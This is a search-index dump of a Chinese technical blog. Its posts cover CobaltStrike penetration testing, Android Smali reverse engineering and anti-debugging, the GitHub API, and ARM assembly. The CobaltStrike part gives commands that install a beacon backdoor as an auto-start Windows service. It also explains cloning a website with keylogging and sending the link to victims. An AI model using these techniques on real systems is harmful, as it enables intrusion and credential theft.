从上图我们可以看到,确实提权了,权限为system. 也可以在Beacon中输入命令getsystem,获取system权限 需要注意的是,当权限太低的时候,提权会不成功. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:15:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"横向移动 Target视图下的横向移动 在执行完端口扫描后,目标视图中,选择一个目标,右键-\u003eJump-\u003epsexec,即可选择凭证进行横向移动,如果该机使用了和之前的目标机一样的凭证,则会成功返回一个system beacon. 窃取令牌 在进程列表中,寻找以管理员身份运行的进程,并选定进行steal token,如果成功,则会返回域管权限的beacon,但是一般情况下绝不会那么简单的… 其他手段横向移动 可以各种系统漏洞:比如说用ms17-010,ms08-067批量检测一下内网. 弱口令检测. 中间件漏洞. Web端漏洞. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:16:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"控制持久化 在Windows中,拿到目标主机权限后,维持权限是必不可少的工作.目前常见的手法有: 注册表 启动项 计时任务 设置服务 shift后门 Dll劫持 利用安装的某些程序 ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:17:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"Windows Service维持权限 在CobaltStrike中生成一个Windows Service服务后门,导出时命名为beacon.exe 在目标机中执行如下命令: C:\\Windows\\Temp upload C:\\Users\\XiaLuoHun\\Desktop\\beacon.exe shell sc create \"thisisserver\" binpath= \"C:\\Users\\XiaLuoHun\\Desktop\\beacon.exe\" shell sc description \"thisisserver\" \"description\" shell sc config \"thisisserver\" start= auto shell net start \"thisisserver\" 这样的话目标机每次开机,都会运行你的beacon.exe后门. 需要注意的是,以上操作如果没有权限的话,就会失败. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:17:1","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"网站克隆 根据个人需求,填写克隆网站,主机地址和端口,注意端口不要冲突,记得把键盘记录打开. 点击Clone,就会生成一条链接.需要注意的是,这一步有可能不成功,就需要你换个网址了. 接下来,就可以把这条链接发给别人了,当别人在这个网站上进行键盘操作时,就可以在Web Log窗口查看了. ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:18:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["渗透测试"],"content":"用户手册 CobaltStrike4.0用户手册.pdf ","date":"2021-09-10","objectID":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/:19:0","tags":["CobaltStrike"],"title":"CobaltStrike使用","uri":"/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cobaltstrike/"},{"categories":["Android基础"],"content":"Smali Smali是Android dex文件的反汇编. ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:1:0","tags":["Smali"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Dalvik 概述 Android移动设备平台的核心组成部分之一,支持已转换为.dex(即Dalvik Executable)格式的Java应用程序的运行. 允许在有限的内存中同时运行多个虚拟机的实例,并且每一个Dalvik应用作为一个独立的Linux进程执行. 2014年6月5号,ART虚拟机代替Dalvik虚拟机. 指令格式 低版本NDK的源码中有Dalvik指令格式介绍,这里我们使用在线的Android源码查看Dalvik指令格式 http://androidxref.com/ Smali_Dalvik指令格式.7z instruction-formats.html 上图中,左侧每一个字母表示4位,空格表示16位. 中间一列的 22x 第一个2表示有几个16位, 第二个2表示有几个寄存器,第三个x表示没有附加数值. dalvik-bytecode.html 解析指令的时候,先根据op拿到指令格式,然后去instruction-formats.html查. 字符串池 例子：op VAA, string@BBBB 指令用到了1个寄存器参数vAA,并且还附加了一个字符串常量池索引string@BBBB mov v0, “Hello” mov v0, 0x12345678 以上两种对于解释执行的语言来说都是不可以的. 我们可以做个池,通常来说是个哈希表,如: 0 “Hello Luo” 1 “HelloHun” 代码就可以写成 mov v0, 0,但是这样无法区分是给数值0还是池的下标, 所有我们通常这样写,mov v0, string@0 ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:1:1","tags":["Smali"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Dex反汇编工具 Dexdump Android自带的,开源. IDA 可以用来看Smali汇编. dex2jar和jd-gui Java字节码–\u003eDex字节码 Dex字节码–\u003eJava字节码 Java有很多成熟的反编译工具, 我们可以利用dex2jar这个工具将Dex字节码转换为Java字节码,就可以使用Java的反编译工具了. 需要注意的是,jd-gui的反编译结果不是很可靠. JEB(神器) 将IDA的每个字母加1就是JEB. Android版的IDA. baksmali 反汇编Dex文件. smali 将修改后的smali文件重新编译为Dex文件. 通常我们使用Jeb寻找关键位置,然后baksmali修改,smali重新编译. 但是这样太麻烦了,就有了apktool. apktool Google提供的apk编译工具,内部用baksmail,加了资源的解析和编译. ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:1:2","tags":["Smali"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Smali汇编 概述 寄存器 Dalvik是基于寄存器的虚拟机,没有栈,寄存器为v0-v65535. 不用任何寄存器存函数返回值. 类型表示 语法 类型 V void Z boolean B byte S short C char I int J long F float D double L 类类型 [ 一维数组 [[ 二维数组 [[[ 三维数组 .method myAdd(I, I)I 方法表示 Dalvik使用方法名,参数,返回值来描述一个方法. 方法格式: LPackage/Name/ObjectName;-\u003eMethodName(III) Z LPackage/Name/ObjectName; : 类类型 MethodName : 方法名 (III) : 为参数类型(int,int,int) Z : 为返回值类型(boolean) invoke-virtual {p0, v0, v1}, Lorg/example/luotst/MainActivity;-\u003emyAdd(II)I 字段表示 Dalvik使用类类型,字段名字,字段类型来描述一个字段. 字段格式: LPackage/Name/ObjectName;-\u003eFieldName:Ljava/lang/String LPackage/Name/ObjectName; : 类类型 FieldName : 为字段名称 Ljava/lang/String : 为字段类型 .line 23 const/16 v0, 0x14 iput v0, p0, Lorg/example/luotst/MainActivity;-\u003emData1:I .line 24 const-string v0, \"LuoHun\" iput-object v0, p0, Lorg/example/luotst/MainActivity;-\u003emData2:Ljava/lang/String; 参数与局部变量的区分 Java代码 int myAdd(int n1, int n2){ int l1 = 10; int l2 = 20; return n1 + n2; } 对应的smali示例 .method myAdd(I, I)I .registers 6 00000000 const/16 v0, 10 00000004 const/16 v1, 20 00000008 add-int v2, p1, p2 0000000C return v2 .end method 上图中p1,p2是Jeb为我们显示的,这是P命名法,为了修改代码和我们识别函数参数方便而设计的,实际上是寄存器v4,v5. smali中的局部变量使用的寄存器是V0-Vn,参数使用的寄存器是Vn+1-Vm. 从上图中可以看到用了6个寄存器,myAdd的参数声明中用了2个,加上this指针就是3个,也就是说v3-v5是参数, 从而推出v0-v2是局部变量,需要注意的是v3中存放的是this指针. 需要提一点的是,P命名法的好处,假如说我们新增了一个局部变量寄存器,这样的话,参数寄存器就会全变动,十分麻烦,使用P命名法,我们新增了一个局部变量寄存器,重新编译的时候,工具会帮我们自动将原来的参数寄存器加1. 指令 主要查看dalvik-bytecode.html文件. nop 空操作,通常是为了地址对齐. move 4字节整型传送 Dalvik是基于寄存器的,没有栈的概念,全部用寄存器操作,寄存器最大有65536个. 上述第一条指令用4位表示寄存器,4位可表示的寄存器范围为v0-v15, 若是一个函数局部变量很多,寄存器使用超过了16个,第一条指令就放不下了, 所以有了第2和第3条指令. /from表示源寄存器用16位表示 /16表示目标和源寄存器均用16位表示. 示例: Java: int l1 = 10; int l2 = 20; l1 = l2; Smali: 00000000 const/16 v0, 10 00000004 const/16 v1, 20 00000008 move v0, v1 8字节整型传送 寄存器是32位的,long是64位,一个寄存器放不下,所以用两个相邻的寄存器存放64位整型, move-wide就是用来传送64位整型. 示例: Java: long l1 = 10; long l2 = 20; l1 = l2; Smali: 00000000 const-wide/16 v0, 10 00000004 const-wide/16 v2, 20 00000008 move-wide v0, v2 对象传送 mov-object用来传送类对象. 示例: Java: MainActivity m1 = this; Smali: 0000000A move-object v4, p0 取返回值 在smali中,不用任何寄存器来存放函数的返回值,需要通过move-result来取函数的返回值. 示例: Java: @Override protected void onCreate(Bundle savedInstanceState) { if (D){ Log.d(TAG, \"onCreate\"); } super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); int n = myAdd(100, 200); } int myAdd(int n1, int n2){ return n1 + n2; } Samli: 00000020 const/16 v0, 100 00000024 const/16 v1, 200 00000028 invoke-virtual MainActivity-\u003emyAdd(I, I)I, p0, v0, v1 0000002E move-result v0 取异常 示例: Java: try { ServerSocket s = new ServerSocket(0x5566); } catch (IOException e) { e.printStackTrace(); } Smali: :try_0 00000000 new-instance v0, ServerSocket 00000004 const/16 v1, 0x5566 00000008 invoke-direct ServerSocket-\u003e\u003cinit\u003e(I)V, v0, v1 .catch IOException {:try_0 .. :tryend_E} :catch_10 :tryend_E 0000000E goto :18 :catch_10 # used for: Ljava/io/IOException; 00000010 move-exception v0 00000012 invoke-virtual IOException-\u003eprintStackTrace()V, v0 return const 示例: Java: int n1 = 1; int n2 = 16; int n3 = 0x12345678; int n4 = 0x14000000; long l1 = 2; long l2 = 0x12345678; String str = \"Hello Luo\"; Class cls = MainActivity.class; Samli: 00000000 const/4 v0, 1 00000002 const/16 v1, 16 00000006 const v2, 305419896 0000000C const/high16 v3, 0x14000000 00000010 const-wide/16 v4, 2 00000014 const-wide/32 v6, 305419896 0000001A const-string v8, \"Hello Luo\" 0000001E const-class v9, MainActivity monitor 同步指令. 示例一: Java: synchronized int myAdd(int p1, int p2) { return p1 + p2; } Samli: .method declared-synchronized myAdd(I, I)I .registers 3 00000000 monitor-enter p0 00000002 add-int/2addr p1, p2 00000004 monitor-exit p0 00000006 return p1 .end method 示例二: Java: int mySub(int p1, int p2) { synchronized (this) { return p1 - p2; } } Samli: .method mySub(I, I)I .registers 3 00000000 monitor-enter p0 00000002 sub-int/2addr p1, p2 :try_4 00000004 monitor-exit p0 00000006 return p1 :catch_8 # used for: * 00000008 move-exception p1 0000000A monitor-exit p0 .catchall {:try_4 .. :tryend_C} :catch","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:1:3","tags":["Smali"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Smali调试 jdb.exe jdwp协议 是Java Debug Wire Protocol的缩写,定义了调试器(debugger)和被调试的Java虚拟机(target vm)之间的通信协议. 使用jdwp协议来双机调试Android程序,调试之前需要端口映射,但很多工具已提前做好了端口映射. adb forward tcp:8700 jdwp:PID jdb所在目录 输入jdb –help可查看帮助. jdb可以用来调Android程序,Android上调试端口一般为8700,但是单步很麻烦,很多工具已集成该功能. Android调试运行 AndroidMenifest文件说明Debug android:debuggable=\"true\" 虚拟机加不加这个都可以调试. 使用am调试运行 位于Android系统,system/bin目录. 查看帮助 命令行输入 adb shell进shell 然后输入am,即可查看帮助. 调试运行一个Activity am start -D -N org.example.luotest/.MainActivity Jeb 被调试程序源代码 public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button = findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { int n = 3; Log.d(\"Luo\", \"onClick: \" + n); } }); } } 附加调试 切记调试的时候,关闭AndroidStudio,AS会占用8700端口. 在虚拟机中运行该程序. 用Jeb打开该apk,找到按钮相应函数,下断(Ctrl + B) Jeb菜单,调试器开始. 点附上,Jeb就会附加. 在虚拟机中,点击程序的按钮,就会在刚开始下断的地方断下. AndroidStudio(推荐) 下载Smali反汇编插件 smalidea. https://bitbucket.org/JesusFreke/smalidea/downloads/ 安装插件. 使用apktool反编译apk. java -jar apktool.jar d -f app-debug.apk 使用AS导入刚反编译出来的文件 调试运行一个Activity //adb shell am start -D -n packageName/ActivityName(这两个参数在AndroidMainfest.xml里都可以找到) //分别对应package=xxx activity中android:name=xxx adb shell am start -D -N org.example.luotest/.MainActivity 端口映射 adb forward tcp:8700 jdwp:2745 AS下断,远程附加 点击Debug按钮进行调试,就可以调试了. 反调试 检测调试标志 对策:给open这个api下断,发现他读的TracePid,就返回0. 时间差 不通过api拿时间,防止别人通过下时间断点来修改时间. 检测IDA端口号23946 修改IDA端口号: /data/local/tmp/android_server -i 127.0.0.1 -p 8899 ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:1:4","tags":["Smali"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["平台API"],"content":"Github Api调用 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:0:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"概述 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:1:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"v3版Api的文档链接 https://docs.github.com/en/rest/reference ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:1:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"v3版Api的官方教程 https://docs.github.com/en/rest/guides/getting-started-with-the-rest-api ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:1:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"基本访问路径 只是读取的话,完全不用任何授权,可以在命令行、Insomnia、网页等各种情况下直接输入链接访问任何人的所有公开信息. 个人主要信息 https://api.github.com/users/用户名 得到的数据如下图: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"个人所有repo https://api.github.com/users/用户名/repos 会得到一个repo的JSON格式列表. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"repo详细信息 https://api.github.com/repos/用户名/仓库名 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"获取某个repo的内容列表 https://api.github.com/repos/用户名/仓库名/contents 注意这只会返回根目录的内容. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"获取repo中子目录的内容列表 https://api.github.com/repos/用户名/仓库名/contents/目录名 一定要注意这里一定要完全遵循原文件名的大小写,否则无法获得信息.如果是更深层的内容,则在链接列按照顺序逐级写上目录名称. 获取repo中某文件信息 https://api.github.com/repos/用户名/仓库名/contents/文件路径 文件路径是文件的完整路径,区分大小写,只会返回文件基本信息. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:4","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"获取某文件的原始内容(Raw) 通过上面的文件信息中提取download_url这条链接,就能获取它的原始内容了. 直接访问:https://raw.githubusercontent.com/用户名/仓库名/分支名/文件路径 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:5","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"repo中所有的commits列表 https://api.github.com/repos/用户名/仓库名/commits ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:6","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某一条commit详情 https://api.github.com/repos/用户名/仓库名/commits/某一条commit的SHA ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:7","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"issues列表 https://api.github.com/repos/用户名/仓库名/issues ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:8","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某条issue详情 https://api.github.com/repos/用户名/仓库名/issues/序号 issues都是以1,2,3这样的序列排号的. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:9","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某issue中的comments列表 https://api.github.com/repos/用户名/仓库名/issues/序号/comments 这个地方有坑,直接按上述那样写的话,最多拿到30条comments,需要先通过拿issue详情,得到comments的个数,然后加参数 ?page=1\u0026per_page=100 循环拿Comments个数. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:10","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某comment详情 https://api.github.com/repos/用户名/仓库名/issues/comments/评论详情的ID 其中评论ID是从issues列表中获得的. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:11","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"注意点 访问的链接最后不能有/,如https://api.github.com/users/XiaLuoHun是可以访问到个人信息的,但是https://api.github.com/users/XiaLuoHun/就不行了,唯一不同是多了一个/. Github的API访问链接是区分大小写的. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:12","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"查询参数 如果在上面基本链接中加入查询条件,那么返回的数据就是filtered,过滤了的.比如要求让列表数据分页显示,或者只返回正在开放的issues.常用如下: 分页功能.格式是?page=页数\u0026per_page=每页包含数量. 如:https://api.github.com/users/dnspy/repos?page=1\u0026per_page=2 issues状态.格式是?state=状态. 状态:open、closed. 如:https://api.github.com/repos/x64dbg/x64dbg/issues?state=open ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:3:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"权限认证 首先需要知道都是,到此为止之前所有的查询都是不需要任何权限的,给个地址就返回数据,全公开. 但是创建文件、更新、删除等就是必须用自己的账号\"登录\"才能实现的.所以为了下面的增删改做准备,需要先看一下权限问题. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:4:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"认证方法 Basic authentication 这种最简单,如果是用curl的话. curl -u \"用户名:密码\" https://api.github.com 如果是用Insomnia等调试工具的话,直接在Auth选项栏里选Basic Auth,然后填上用户名密码即可. OAuth2 token token 说白了就是第二个密码,你既可以不用到处泄露自己的用户名和密码,又可以专门给这个\"第二密码\"设置不同的权限,如有的只可读,有的还可以写等.除此之外,你还可以设置很多个token,也就是第三、第四、第五…密码. 设置token方法 位于github个人账号设置-\u003e开发者设置-\u003e个人token.创建一个新token时,可以选择具体的权限,创建成功时一定要复制到本地保存,只会让你看见一次,如果忘记的话就需要重新生成(其实丢了也不算麻烦). 需要注意的是,token字符串不能存储在github的repo中,经过测试,一旦提交的文件中包含这个token字符串,那么github就会自动删除这个token. 用token通过权限认证 作为url中的参数明文传输. curl https://api.github.com/?access_token=OAUTH-TOKEN 作为header中的参数传输. curl -H \"Authorization: token OAUTH-TOKEN\" https://api.github.com 如果不是用curl而是Insomnia测试的话,和上面basic auth是大同小异的,很容易操作就不复述了. OAuth2 key/secret 这个是除了Personal Access Token之外的另一种好用的方法,即创建自己的OAuth app,然后得到一对client_id和client_secret.如下: 得到这两个值之后,直接在访问任何api的url连接后面显性加上这两个参数即可完成认证,如: https://api.github.com/users/YOUR-USERR-NAME?client_id=YOUR-CLIENT-ID\u0026client_secret=YOUR-CLIENT-SECRET 需要注意的是,目前这种认证方式不支持查询以外的操作,也就是只能GET获取某些api信息,不能执行request里的任何put/PATCH/delete操作. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:4:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增改删contents ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"官方文档 https://docs.github.com/en/rest/reference/repos#contents 注意点 必须添加权限验证(上面有写). 数据传送格式选择json. 文件内容必须是把内容转为Base64字符串再存到json变量中. 文件路径中如果有不存在的文件夹,则会自动创建. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增 传输方法:put 访问路径:https://api.github.com/repos/用户名/仓库名/contents/文件路径 json格式: { \"message\": \"commit\", \"content\": \"VGVzdCBmaWxl\" } 示例 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"改 传输方法:put 访问路径:https://api.github.com/repos/用户名/仓库名/contents/文件路径 json格式: { \"message\": \"update file\", \"content\": \"dXBkYXRlIFRlc3QgZmlsZQ==\", \"sha\": \"84362ca046b156d71d84fa5356ae9afbcb282919\" } 注意: 必须指定该文件的sha码,相当于文件的ID. 文件的sha码会随着文件内容变化而变化,所以必须每次都重新获取才行. 如何获取的话,参考前面的 获取repo中某文件信息. 示例 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"删 传输方法:delete 访问路径:https://api.github.com/repos/用户名/仓库名/contents/文件路径 json格式: { \"message\": \"delete file\", \"sha\": \"115132afb3f1dfcfc0ce11263f944f2d8ac956f2\" } 示例 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:4","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增删改issues 官方文档 https://docs.github.com/en/rest/reference/issues#create-an-issue 和上面contents的增删改差不多,唯一不同的是,issues是不用把内容转为Base64码的. 增 传输方法:post 访问路径:https://api.github.com/repos/用户名/仓库名/issues json格式: { \"title\": \"Creating issue\", \"body\": \"Posting a issue\" } 需要注意的是,issue的数据里面是可以加label,milestone和assignees的.但是必须注意milestone和assignees必须是与已有的名次完全对应才行,否则无法完成创建. 改 传输方法:patch 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号 json格式： { \"title\": \"Creating issue updated\", \"body\": \"Posting a issue\\n\\n Updated from insomnia.\", \"state\": \"open\" } 需要注意的是,如果json中加入空白的labels或assignees,如\"labels\": [],作用就是清空所有的标签和相关人. 锁住某条issue 不允许别人评论(自己可以). 传输方法:put 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号/lock json格式: { \"locked\": true, \"active_lock_reason\": \"too heated\" } 解锁某条issue 传输方法:delete 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号/lock 无json传输 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:6:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增删改comments 增 传输方法:post 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号/comments json格式: { \"body\": \"Create a comment\" } 示例 改 传输方法:patch 访问路径:https://api.github.com/repos/用户名/仓库名/issues/comments/评论ID json格式: { \"body\": \"Create a comment \\n\\n--Updated\" } 需要注意的是,地址中,issues后不用序号了,因为可以通过唯一的评论ID追查到.查看评论ID的方法,可参考上面的 某issue中的comments列表. 示例 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:7:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"删 传输方法:delete 访问路径:https://api.github.com/repos/用户名/仓库名/issues/comments/评论ID 无json传输 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:7:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"参考链接 https://segmentfault.com/a/1190000015144126 一篇文章搞定GithubAPI调用.mhtml ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:8:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["Android基础"],"content":"Arm ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:0","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"基本概念 Arm处理器特点 体积小、低功耗、低成本、高性能. 支持Thumb(16位)/ARM(32位)双指令集,能很好的兼容8位/16位器件. 大量使用寄存器,指令执行速度更快. 大多数数据操作都在寄存器中完成. 寻址方式灵活简单,执行效率高. 指令长度固定. 数据和指令类型 Arm约定数据长度如下: byte(字节) 8bits Halfword(半字) 16bits Word(字) 32bits Arm指令集: 指令集 指令长度 thumb 2字节(16位) arm 4字节(32位) thumb2(常用) 2字节和4字节混合 工作状态 ARM状态:32位,ARM状态执行字对齐的32位ARM指令. Thumb状态:16位,执行半字对齐的16位指令. 状态的切换,看标志寄存器的T位. 寄存器 ARM 处理器一般共有37个寄存器,其中包括: 31个通用寄存器,包括 PC(程序计数器)在内,都是32位的寄存器 6个状态寄存器,都是32位的寄存器 3环可操作的寄存器有17个,R0-R15 CPSR(标志寄存器),除此之外 还有浮点寄存器 重要寄存器 R13(SP):栈指针. R14(LR):链接寄存器,保存返回值.Call指令,将Call的下条指令地址给R14,但是当Call中嵌套调Call时,还是会将LR寄存器压栈保存. R15(PC):程序计数器,等价于x86的EIP. 历史遗留别名寄存器 R11(FP) R12(IP) 标志寄存器 ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:1:1","tags":["Arm"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"编译环境 手工编译 本地程序生成过程 预处理 gcc -E hello.c -o hello.i C到汇编 gcc -S -mthumb hello.i -o hello.s 汇编到Arm gcc -c hello.s -o hello.o 链接 gcc hello.o -o hello 汇编编译器 编译的时候用Clang 加命令行参数-S,就可以调到上述的汇编编译器. 示例 hello.c: #include \u003cstdio.h\u003e int main(){ printf(\"Hello Arm\\n\"); return 0; } Markfile脚本: NDK_PATH :=D:/AndroidSDK/ndk/21.4.7075529/toolchains/llvm/prebuilt/windows-x86_64/bin BUILD_CLANG :=$(NDK_PATH)/armv7a-linux-androideabi16-clang all: #预处理 $(BUILD_CLANG) -E -o Hello.i Hello.c #C到汇编 -m是指cpu -marm 编译arm -mthumb 编译thumb $(BUILD_CLANG) -S -mthumb -o Hello.s Hello.i #编译 $(BUILD_CLANG) -c -o Hello.o Hello.s #链接 $(BUILD_CLANG) -o Hello Hello.o install: adb push Hello /data/local/tmp adb shell chmod a+x /data/local/tmp/Hello adb shell /data/local/tmp/Hello Arm_手工编译.7z Cmake编译 不支持Arm编译,仅支持x86汇编. ndk-build编译(推荐) 新建一个jni或cpp文件夹,将.s文件放进去. .text .globl main .p2align 2 .type main,%function .code 32 main: push {r11, lr} 